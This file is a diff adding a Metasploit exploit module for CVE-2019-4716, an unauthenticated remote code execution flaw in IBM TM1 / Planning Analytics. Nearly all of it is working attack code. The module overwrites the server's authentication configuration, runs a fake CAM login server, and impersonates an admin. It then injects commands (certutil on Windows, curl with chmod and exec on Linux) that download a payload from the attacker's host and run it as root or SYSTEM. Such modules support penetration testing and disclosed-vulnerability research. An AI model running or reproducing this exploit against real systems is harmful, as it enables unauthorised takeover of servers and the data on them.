@@ -1,0 +1,654 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'openssl'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Remote::HttpServer
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "IBM TM1 / Planning Analytics Unauthenticated Remote Code Execution",
+      'Description'    => %q{
+        This module exploits a vulnerability in IBM TM1 / Planning Analytics that allows
+        an unauthenticated attacker to perform a configuration overwrite.
+        It starts by querying the Admin server for the available applications, picks one,
+        and then exploits it. You can also provide an application name to bypass this step,
+        and exploit the application directly.
+        The configuration overwrite is used to change an application server authentication
+        method to "CAM", a proprietary IBM auth method, which is simulated by the exploit.
+        The exploit then performs a fake authentication as admin, and finally abuses TM1
+        scripting to perform a command injection as root or SYSTEM.
+        Testing was done on IBM PA 2.0.6 and IBM TM1 10.2.2 on Windows and Linux.
+        Versions up to and including PA 2.0.8 are vulnerable. It is likely that versions
+        earlier than TM1 10.2.2 are also vulnerable (10.2.2 was released in 2014).
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Pedro Ribeiro <pedrib@gmail.com>',
+                # Vulnerability discovery and Metasploit module
+          'Gareth Batchelor <gbatchelor@cloudtrace.com.au>'
+                # Real world exploit testing and feedback
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2019-4716' ],
+          [ 'URL', 'https://www.ibm.com/support/pages/node/1127781' ],
+          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/ibm-tm1-rce.txt' ],
+          [ 'URL', 'https://seclists.org/fulldisclosure/2020/Mar/44' ]
+        ],
+      'Targets'        =>
+        [
+          [ 'Windows',
+            {
+              'Platform'  => 'win',
+              'Arch'      => [ARCH_X86, ARCH_X64]
+            }
+          ],
+          [ 'Windows (Command)',
+            {
+              'Platform'  => 'win',
+              'Arch'      => [ARCH_CMD],
+              'Payload'   =>
+              {
+                # Plenty of bad chars in Windows... there might be more lurking
+                'BadChars'  => "\x25\x26\x27\x3c\x3e\x7c",
+              }
+            }
+          ],
+          [ 'Linux',
+            {
+              'Platform'  => 'linux',
+              'Arch'      => [ARCH_X86, ARCH_X64]
+            }
+          ],
+          [ 'Linux (Command)',
+            {
+              'Platform'  => 'unix',
+              'Arch'      => [ARCH_CMD],
+              'Payload'   =>
+              {
+                # only one bad char in Linux, baby! (that we know of...)
+                'BadChars'  => "\x27",
+              }
+            }
+          ],
+          [ 'AIX (Command)',
+            {
+              # This should work on AIX, but it was not tested!
+              'Platform'  => 'unix',
+              'Arch'      => [ARCH_CMD],
+              'Payload'   =>
+              {
+                # untested, but assumed to be similar to Linux
+                'BadChars'  => "\x27",
+              }
+            }
+          ],
+        ],
+      'Stance'        => Msf::Exploit::Stance::Aggressive,
+          # we need this to run in the foreground
+      'DefaultOptions'  =>
+        {
+          # give the target lots of time to download the payload
+          'WfsDelay' => 30,
+        },
+      'Privileged'     => true,
+      'DisclosureDate' => "Dec 19 2019",
+      'DefaultTarget'  => 0))
+    register_options(
+      [
+        Opt::RPORT(5498),
+        OptBool.new('SSL', [true, 'Negotiate SSL/TLS', true]),
+      ])
+    register_advanced_options [
+      OptString.new('APP_NAME', [false, 'Name of the target application']),
+      OptInt.new('AUTH_ATTEMPTS', [true, "Number of attempts to auth to CAM server", 10]),
+    ]
+  end
+
+  ## Packet structure start
+  # these are client message types
+  MSG_TYPES = {
+    :auth => [ 0x0, 0x1 ],
+    :auth_uniq => [ 0x0, 0x3 ],
+    :auth_1001 => [ 0x0, 0x4 ],
+    :auth_cam_pass => [ 0x0, 0x8 ],
+    :auth_dist => [ 0x0, 0xa ],
+    :obj_register => [ 0, 0x21 ],
+    :obj_prop_set => [ 0, 0x25 ],
+    :proc_create => [ 0x0, 0x9c ],
+    :proc_exec => [ 0x0, 0xc4 ],
+    :get_config => [ 0x1, 0x35 ],
+    :upd_clt_pass => [ 0x1, 0xe2 ],
+    :upd_central => [ 0x1, 0xae ],
+  }
+
+  # packet header is universal for both client and server
+  PKT_HDR = [ 0, 0, 0xff, 0xff ]
+
+  # pkt end marker (client only, server responses do not have it)
+  PKT_END = [ 0xff, 0xff ]
+
+  # empty auth object, used for operations that do not require auth
+  AUTH_OBJ_EMPTY = [ 5, 3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ]
+
+  # This is actually the client version number
+  # 0x6949200 = 110400000 in decimal, or version 11.4
+  # The lowest that version 11.4 seems to accept is 8.4, so leave that as the default
+  # 8.4 = 0x4CACE80
+  # 9.1 = 0x55ED120
+  # 9.4 = 0x5636500
+  # 10.1 = 0x5F767A0
+  # 10.4 = 0x5FBFB80
+  # 11.1 = 0x68FFE20
+  # 11.4 = 0x6949200
+  #
+  # If something doesn't work, try using one of the values above, but bear in mind this module
+  # was tested on 10.2.2 and 11.4,
+  VERSION = [ 0x03, 0x04, 0xca, 0xce, 0x80 ]
+  ## Packet structure end
+
+  ## Network primitives start
+  # unpack a string (hex string to array of bytes)
+  def str_unpack(str)
+    arr = []
+    str.scan(/../).each do |b|
+      arr += [b].pack('H*').unpack('C*')
+    end
+    arr
+  end
+
+  # write strings directly to socket; each 2 string chars are a byte
+  def sock_rw_str(sock, msg_str)
+    sock_rw(sock, str_unpack(msg_str))
+  end
+
+  # write array to socket and get result
+  # wait should also be implemented in msf
+  def sock_rw(sock, msg, ignore = false, wait = 0)
+    sock.write(msg.pack('C*'))
+    if not ignore
+      sleep(wait)
+      recv_sz = sock.read(2).unpack('H*')[0].to_i(16)
+      bytes = sock.read(recv_sz-2).unpack('H*')[0]
+      bytes
+    end
+  end
+
+  def sock_r(sock)
+    recv_sz = sock.read(2).unpack('H*')[0].to_i(16)
+    bytes = sock.read(recv_sz-2).unpack('H*')[0]
+    bytes
+  end
+
+  def get_socket(app_host, app_port, ssl = 0)
+    begin
+      ctx = { 'Msf' => framework, 'MsfExploit' => self }
+      sock = Rex::Socket.create_tcp(
+        { 'PeerHost' => app_host, 'PeerPort' => app_port, 'Context' => ctx, 'Timeout' => 10 }
+      )
+    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError
+      sock.close if sock
+    end
+    if sock.nil?
+      fail_with(Failure::Unknown, 'Failed to connect to the chosen application')
+    end
+    if ssl == 1
+      # also need to add support for old ciphers
+      ctx = OpenSSL::SSL::SSLContext.new
+      ctx.min_version = OpenSSL::SSL::SSL3_VERSION
+      ctx.security_level = 0
+      ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
+      s = OpenSSL::SSL::SSLSocket.new(sock, ctx)
+      s.sync_close = true
+      s.connect
+      return s
+    end
+    return sock
+  end
+  ## Network primitives end
+
+  ## Packet primitives start
+  def pack_sz(sz)
+    [sz].pack('n*').unpack('C*')
+  end
+
+  # build a packet, ready to send
+  def pkt_build(msg_type, auth_obj, contents)
+    pkt = PKT_HDR + msg_type + auth_obj + contents + PKT_END
+    pack_sz(pkt.length + 2) + pkt
+  end
+
+  # extracts the first object from a server response
+  def obj_extract(res)
+    arr = str_unpack(res)
+
+    # ignore packet header (4 bytes)
+    arr.shift(PKT_HDR.length)
+    if arr[0] == 5
+      # this is an object, get the type (1 byte) plus the object bytes (9 bytes)
+      obj = Array.new
+      obj = arr[0..9]
+      obj
+    end
+  end
+
+  # adds a string to a packet
+  # C string = 0x2; utf string = 0xe; binary = 0xf
+  def stradd(str, type = 0xe)
+    arr = [ type ]                 # string type
+    arr += pack_sz(str.length)
+    arr += str.unpack('C*')
+    arr
+  end
+
+  # packs binary data into an array
+  def datapack(data)
+    arr = []
+    data.chars.each do |d|
+      arr << d.ord
+    end
+    arr
+  end
+
+  def binadd(data)
+    arr = [ 0xf ]                     # binary type 0xf
+    arr += pack_sz(data.length)       # 2 byte size
+    arr += datapack(data)             # ... and add the data
+  end
+
+  def get_str(data)
+    s = ""
+    while data[0] != '"'.ord
+      data.shift
+    end
+    data.shift
+    while data[0] != '"'.ord
+      s += data[0].chr
+      data.shift
+    end
+    # comma
+    data.shift
+    s
+  end
+
+  # This fetches the current IntegratedSecurityMode from a packet such as
+  # 0000ffff070000000203000000 01 07000000020e00000e0000                  (1)
+  # 0000ffff070000000203000000 02 07000000020e00000e00084b65726265726f73  (2)
+  # 0000ffff070000000203000000 06 07000000010e0000                        (6)
+  def get_auth(data)
+    # make it into an array
+    data = str_unpack(data)
+    if data.length > 13
+      # skip 13 bytes (header + array indicator + index indicator)
+      data.shift(13)
+      # fetch the auth method byte
+      data[0]
+    end
+  end
+
+  def update_auth(auth_method, restore = false)
+    # first byte of data is ignored, so add an extra space
+    if restore
+      srv_config = " IntegratedSecurityMode=#{auth_method}"
+    else
+      # To enable CAM server authentication over SSL, the CAM server certificate has to be previously
+      # imported into the server. Since we can't do this, disable SSL in the fake CAM.
+      srv_config = " IntegratedSecurityMode=#{auth_method}\n" +
+        "ServerCAMURI=http://#{srvhost}:#{srvport}\n" +
+        "ServerCAMURIRetryAttempts=10\nServerCAMIPVersion=ipv4\n" +
+        "CAMUseSSL=F\n"
+    end
+
+    arr =
+      [ 3 ] + [ 0, 0, 0, 2 ] +                             # no idea what this index is
+      [ 3 ] + [ 0, 0, 0, 2 ] +                             # same here
+      [ 3 ] + [ 0 ] * 4 +                                  # same here
+      stradd(rand_text_alpha(5..12)) +                     # same here...
+      stradd("tm1s_delta.cfg") +                           # update file name
+      binadd(srv_config) +                                 # file data
+      stradd(rand_text_alpha(0xf))                         # last sync timestamp, max len 0xf
+
+    upd_auth = pkt_build(
+      MSG_TYPES[:upd_central],
+      AUTH_OBJ_EMPTY,
+      [ 7 ] +                                   # array type
+      [ 0, 0, 0, 7 ] +                          # array len (fixed size of 7 for this pkt)
+      arr
+    )
+
+    upd_auth
+  end
+  ## Packet primitives end
+
+  ## CAM HTTP functions start
+  def on_request_uri(cli, request)
+    xml_res = %{<?xml version="1.0" encoding="UTF-8"?>
+    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns1="http://developer.cognos.com/schemas/dataSourceCommandBlock/1/" xmlns:bus="http://developer.cognos.com/schemas/bibus/3/" xmlns:cm="http://developer.cognos.com/schemas/contentManagerService/1" xmlns:ns10="http://developer.cognos.com/schemas/indexUpdateService/1" xmlns:ns11="http://developer.cognos.com/schemas/jobService/1" xmlns:ns12="http://developer.cognos.com/schemas/metadataService/1" xmlns:ns13="http://developer.cognos.com/schemas/mobileService/1" xmlns:ns14="http://developer.cognos.com/schemas/monitorService/1" xmlns:ns15="http://developer.cognos.com/schemas/planningAdministrationConsoleService/1" xmlns:ns16="http://developer.cognos.com/schemas/planningRuntimeService/1" xmlns:ns17="http://developer.cognos.com/schemas/planningTaskService/1" xmlns:ns18="http://developer.cognos.com/schemas/reportService/1" xmlns:ns19="http://developer.cognos.com/schemas/systemService/1" xmlns:ns2="http://developer.cognos.com/schemas/agentService/1" xmlns:ns3="http://developer.cognos.com/schemas/batchReportService/1" xmlns:ns4="http://developer.cognos.com/schemas/dataIntegrationService/1" xmlns:ns5="http://developer.cognos.com/schemas/dataMovementService/1" xmlns:ns6="http://developer.cognos.com/schemas/deliveryService/1" xmlns:ns7="http://developer.cognos.com/schemas/dispatcher/1" xmlns:ns8="http://developer.cognos.com/schemas/eventManagementService/1" xmlns:ns9="http://developer.cognos.com/schemas/indexSearchService/1">
+    <SOAP-ENV:Body SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+      <cm:queryResponse>
+        <result baseClassArray xsi:type="SOAP-ENC:Array" SOAP-ENC:arrayType="tns:baseClass[1]">
+        PLACEHOLDER
+        </result>
+      </cm:queryResponse>
+    </SOAP-ENV:Body>
+    </SOAP-ENV:Envelope>}
+
+    session =
+    %Q{   <item xsi:type="bus:session">
+            <identity>
+              <value baseClassArray xsi:type="SOAP-ENC:Array" SOAP-ENC:arrayType="tns:baseClass[1]">
+                <item xsi:type="bus:account">
+                  <searchPath><value>admin</value></searchPath>
+                </item>
+              </value>
+            </identity>
+          </item>}
+
+    account =
+    %Q{   <item xsi:type="bus:account">
+            <defaultName><value>admin</value></defaultName>
+          </item>}
+
+    headers = { "SOAPAction" => '"http://developer.cognos.com/schemas/contentManagerService/1"'}
+    if request.body.include? "<searchPath>/</searchPath>"
+      print_good("CAM: Received first CAM query, responding with account info")
+      response = xml_res.sub('PLACEHOLDER', account)
+    elsif request.body.include? "<searchPath>~~</searchPath>"
+      print_good("CAM: Received second CAM query, responding with session info")
+      response = xml_res.sub('PLACEHOLDER', session)
+    elsif request.body.include? "<searchPath>admin</searchPath>"
+      print_good("CAM: Received third CAM query, responding with random garbage")
+      response = rand_text_alpha(5..12)
+    elsif request.method == "GET"
+      print_good("CAM: Received request for payload executable, shell incoming!")
+      response = @pl
+      headers = { "Content-Type" => "application/octet-stream" }
+    else
+      response = ''
+      print_error("CAM: received unknown request")
+    end
+    send_response(cli, response, headers)
+  end
+  ## CAM HTTP functions end
+
+  def restore_auth(app, auth_current)
+    print_status("Restoring original authentication method #{auth_current}")
+    upd_cent = update_auth(auth_current, true)
+    s = get_socket(app[2], app[3], app[5])
+    sock_rw(s, upd_cent, true)
+    s.close
+  end
+
+  def exploit
+    # first let's check if SRVHOST is valid
+    if datastore['SRVHOST'] == "0.0.0.0"
+      fail_with(Failure::Unknown, "Please enter a valid IP address for SRVHOST")
+    end
+
+    # The first step is to query the administrative server to see what apps are available.
+    # This action can be done unauthenticated. We then list all the available app servers
+    # and pick a random one that is currently accepting clients. This step is important
+    # not only to know what app servers are available, but also to know if we need to use
+    # SSL or not.
+    # The admin server is usually at 5498 using SSL. Non-SSL access is disabled by default, but when enabled, it's available at port 5495
+    #
+    # Step 1: fetch the available applications / servers from the Admin server
+    # ... if the user did not enter an APP_NAME
+    if datastore['APP_NAME'].nil?
+      connect
+      print_status("Connecting to admin server and obtaining application data")
+
+      # for this packet we use string type 0xc (?) and cut off the PKT_END
+      pkt_control = PKT_HDR + [0] + stradd(lhost, 0xc)
+      pkt_control = pack_sz(pkt_control.length + 2) + pkt_control
+      data = sock_rw(sock, pkt_control)
+      disconnect
+
+      if data
+        # now process the response
+        apps = []
+
+        data = str_unpack(data)
+
+        # ignore packet header (4 bytes)
+        data.shift(PKT_HDR.length)
+
+        # now just go through the list we received, sample format below
+        # "24retail","tcp","10.11.12.123","17414","1460","1","127.0.0.1,127.0.0.1,127.0.0.1","1","0","","","","0","","0","","ipv4","22","0","2","http://centos7.doms.com:8014","8014"
+        # "GO_New_Stores","tcp","10.11.12.123","45557","1460","0","127.0.0.1,127.0.0.1,127.0.0.1","1","1","","","","0","","0","","ipv4","23","0","2","https://centos7.doms.com:5010","5010"
+        # "GO_Scorecards","tcp","10.11.12.123","44321","1460","0","127.0.0.1,127.0.0.1,127.0.0.1","1","1","","","","0","","0","","ipv4","22","0","2","https://centos7.doms.com:44312","44312"
+        # "Planning Sample","tcp","10.11.12.123","12345","1460","0","127.0.0.1,127.0.0.1,127.0.0.1","1","1","","","","0","","0","","ipv4","22","0","2","https://centos7.doms.com:12354","12354"
+        # "proven_techniques","tcp","10.11.12.123","53333","1460","0","127.0.0.1,127.0.0.1,127.0.0.1","1","1","","","","0","","0","","ipv4","22","0","2","https://centos7.doms.com:5011","5011"
+        # "SData","tcp","10.11.12.123","12346","1460","0","127.0.0.1,127.0.0.1,127.0.0.1","1","1","","","","0","","0","","ipv4","22","0","2","https://centos7.doms.com:8010","8010"
+        while data != nil and data.length > 2
+          # skip the marker (0x0, 0x5) that indicates the start of a new app
+          data = data[2..-1]
+
+          # read the size and fetch the data
+          size = (data[0..1].pack('C*').unpack('H*')[0].to_i(16))
+          data_next = data[2+size..-1]
+          data = data[2..size]
+
+          # first is application name
+          app_name = get_str(data)
+
+          # second is protocol, we don't care
+          proto = get_str(data)
+
+          # third is IP address
+          ip = get_str(data)
+
+          # app port
+          port = get_str(data)
+
+          # mtt maybe? don't care
+          mtt = get_str(data)
+
+          # not sure, and don't care
+          unknown = get_str(data)
+
+          # localhost addresses? again don't care
+          unknown_addr = get_str(data)
+
+          # I think this is the accepting clients flag
+          accepts = get_str(data)
+
+          # and this is a key one, the SSL flag
+          ssl = get_str(data)
+
+          # the leftover data is related to the REST API *I think*, so we just ignore it
+
+          print_good("Found app #{app_name} #{proto} ip: #{ip} port: #{port} available: #{accepts} SSL: #{ssl}")
+          apps.append([app_name, proto, ip, port.to_i, accepts.to_i, ssl.to_i])
+
+          data = data_next
+        end
+      else
+        fail_with(Failure::Unknown, 'Failed to obtain application data from the admin server')
+      end
+
+      # now pick a random application server that is accepting clients via TCP
+      app = apps.sample
+      total = apps.length
+      count = 0
+
+      # TODO: check for null return here, and probably also response size > 0x20
+      while app[1] != "tcp" and app[4] != 1 and count < total
+        app = apps.sample
+        count += 1
+      end
+
+      if count == total
+        fail_with(Failure::Unknown, 'Failed to find an application we can attack')
+      end
+      print_status("Picked #{app[0]} as our target, connecting...")
+
+    else
+      # else if the user entered an APP_NAME, build the app struct with that info
+      ssl = datastore['SSL']
+      app = [datastore['APP_NAME'], 'tcp', rhost, rport, 1, (ssl ? 1 : 0)]
+      print_status("Attacking #{app[0]} on #{peer} as requested with TLS #{ssl ? "on" : "off"}")
+    end
+
+    s = get_socket(app[2], app[3], app[5])
+
+    # Step 2: get the current app server configuration variables, such as the current auth method used
+    get_conf = stradd(app[0])
+    get_conf += VERSION
+    auth_get = pkt_build(MSG_TYPES[:get_config], AUTH_OBJ_EMPTY, get_conf)
+    data = sock_rw(s, auth_get)
+    auth_current = get_auth(data)
+
+    print_good("Current auth method is #{auth_current}, we're good to go!")
+    s.close
+
+    # Step 3: start the fake CAM server / exploit server
+    if payload.arch.include? ARCH_CMD
+      @pl = ''
+    else
+      @pl = generate_payload_exe
+    end
+
+    # do not use SSL for the CAM server!
+    if datastore['SSL']
+      ssl_restore = true
+      datastore['SSL'] = false
+    end
+
+    print_status("Starting up the fake CAM server...")
+    start_service(
+      {
+        'Uri' => {
+          'Proc' => Proc.new { |cli, req|
+            on_request_uri(cli, req)
+          },
+          'Path' => '/'
+        },
+      }
+    )
+    datastore['SSL'] = true if ssl_restore
+
+    # Step 4: send the server config update packet, and ignore what it sends back
+    print_status("Changing authentication method to 4 (CAM auth)")
+    upd_cent = update_auth(4)
+    s = get_socket(app[2], app[3], app[5])
+    sock_rw(s, upd_cent, true)
+    s.close
+
+    # Step 5: send the CAM auth request and obtain the authentication object
+    # app name
+    auth_pkt = stradd(app[0])
+
+    auth_pkt += [ 0x7, 0, 0, 0, 3 ]                           # array with 3 objects
+
+    # passport, can be random
+    auth_pkt += stradd(rand_text_alpha(5..12))
+
+    # no idea what these vars are, but they don't seem to matter
+    auth_pkt += stradd(rand_text_alpha(5..12))
+    auth_pkt += stradd(rand_text_alpha(5..12))
+
+    # client IP
+    auth_pkt += stradd(lhost)
+
+    # add the client version number
+    auth_pkt += VERSION
+
+    auth_dist = pkt_build(MSG_TYPES[:auth_cam_pass], AUTH_OBJ_EMPTY, auth_pkt)
+
+    print_status("Authenticating using CAM Passport and our fake CAM Service...")
+    s = get_socket(app[2], app[3], app[5])
+
+    # try to authenticate up to AUTH_ATTEMPT times, but usually it works the first try
+    # adjust the 4th parameter to sock_rw to increase the timeout if it's not working and / or the CAM server is on another network
+    counter = 1
+    res_auth = ''
+    while(counter < datastore['AUTH_ATTEMPTS'])
+      # send the authenticate request, but wait a bit so that our fake CAM server can respond
+      res_auth = sock_rw(s, auth_dist, false, 0.5)
+      if res_auth.length < 20
+        print_error("Failed to authenticate on attempt number #{counter}, trying again...")
+        counter += 1
+        next
+      else
+        break
+      end
+    end
+    if counter == datastore['AUTH_ATTEMPTS']
+      # if we can't auth, bail out, but first restore the old auth method
+      s.close
+      #restore_auth(app, auth_current)
+      fail_with(Failure::Unknown, "Failed to authenticate to the Application server. Run the exploit and try again!")
+    end
+
+    auth_obj = obj_extract(res_auth)
+
+    # Step 6: create a Process object
+    print_status("Creating our Process object...")
+    proc_obj = obj_extract(sock_rw(s, pkt_build(MSG_TYPES[:proc_create], auth_obj, [])))
+
+    if payload.arch == ["cmd"]
+      cmd_one = payload.encoded
+      cmd_two = ''
+    else
+      payload_url = "http://#{srvhost}:#{srvport}/"
+      exe_name = rand_text_alpha(5..13)
+      if target['Platform'] == 'win'
+        # the Windows command has to be split amongst two lines; the & char cannot be used to execute two processes in one line
+        exe_name += ".exe"
+        exe_name = "C:\\Windows\\Temp\\" + exe_name
+        cmd_one = "certutil.exe -urlcache -split -f #{payload_url} #{exe_name}"
+        cmd_two = exe_name
+      else
+        # the Linux one can actually be done in one line, but let's make them similar
+        exe_name = "/tmp/" + exe_name
+        cmd_one = "curl #{payload_url} -o #{exe_name};"
+        cmd_two = "chmod +x #{exe_name}; exec #{exe_name}"
+      end
+
+      register_file_for_cleanup(exe_name)
+    end
+
+    proc_cmd =
+      [ 0x3, 0, 0, 2, 0x3c ] +                        # no idea what this index is
+      [ 0x7, 0, 0, 0, 2 ] +                           # array with 2 objects (2 line script)
+    # the first argument is the command
+    # the second whether it should wait (1) or not (0) for command completion before returning
+      stradd("executecommand('#{cmd_one}', #{cmd_two.empty? ? "0" : "1"});") +
+      stradd("executecommand('#{cmd_two}', 0);")
+
+    # Step 7: add the commands into the process object
+    print_status("Adding command: \"#{cmd_one}\" to the Process object...")
+    if cmd_two != ''
+      print_status("Adding command: \"#{cmd_two}\" to the Process object...")
+    end
+    sock_rw(s, pkt_build(MSG_TYPES[:obj_prop_set], [], proc_obj + proc_cmd))
+
+    # Step 8: register the Process object with a random name
+    obj_name = rand_text_alpha(5..12)
+    print_status("Registering the Process object under the name '#{obj_name}'")
+    proc_obj = obj_extract(sock_rw(s, pkt_build(MSG_TYPES[:obj_register], auth_obj, proc_obj + stradd(obj_name))))
+
+    # Step 9: execute the Process!
+    print_status("Now let's execute the Process object!")
+    sock_rw(s, pkt_build(MSG_TYPES[:proc_exec], [], proc_obj + [ 0x7 ] + [ 0 ] * 4), true)
+    s.close
+
+    # Step 10: restore the auth method and enjoy the shell!
+    restore_auth(app, auth_current)
+
+    if payload.arch.include? ARCH_CMD
+      print_good("Your command should have executed by now, enjoy!")
+    end
+  end
+end
